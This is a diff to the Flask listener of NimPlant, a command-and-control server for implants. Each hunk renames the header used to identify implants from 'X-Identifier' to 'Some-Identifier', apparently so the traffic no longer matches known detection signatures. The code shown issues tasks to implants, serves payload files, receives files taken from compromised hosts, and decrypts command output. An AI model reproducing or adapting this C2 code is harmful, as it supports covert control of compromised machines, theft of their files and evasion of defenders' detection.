@@ -74,7 +74,7 @@ def flaskListener(xor_key):
             elif flask.request.method == "POST":
                 data = flask.request.json
                 np = np_server.getNimplantByGuid(
-                    flask.request.headers.get("X-Identifier")
+                    flask.request.headers.get("Some-Identifier")
                 )
                 data = data["data"]
 
@@ -129,7 +129,7 @@ def flaskListener(xor_key):
     @app.route(taskPath, methods=["GET"])
     # Return the first active task IF the user-agent is as expected
     def getTask():
-        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        np = np_server.getNimplantByGuid(flask.request.headers.get("Some-Identifier"))
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 # Update the external IP address if it changed
@@ -167,7 +167,7 @@ def flaskListener(xor_key):
     # Return a hosted file as gzip-compressed stream for the 'upload' command,
     # IF the user-agent is as expected AND the caller knows the file ID
     def uploadFile(fileId):
-        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        np = np_server.getNimplantByGuid(flask.request.headers.get("Some-Identifier"))
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 if (np.hostingFile != None) and (
@@ -230,7 +230,7 @@ def flaskListener(xor_key):
     @app.route(taskPath + "/u", methods=["POST"])
     # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
     def downloadFile():
-        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        np = np_server.getNimplantByGuid(flask.request.headers.get("Some-Identifier"))
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 if np.receivingFile != None:
@@ -280,7 +280,7 @@ def flaskListener(xor_key):
     # Parse command output IF the user-agent is as expected
     def getResult():
         data = flask.request.json
-        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        np = np_server.getNimplantByGuid(flask.request.headers.get("Some-Identifier"))
         if np is not None:
             if userAgent == flask.request.headers.get("User-Agent"):
                 res = json.loads(decryptData(data["data"], np.cryptKey))
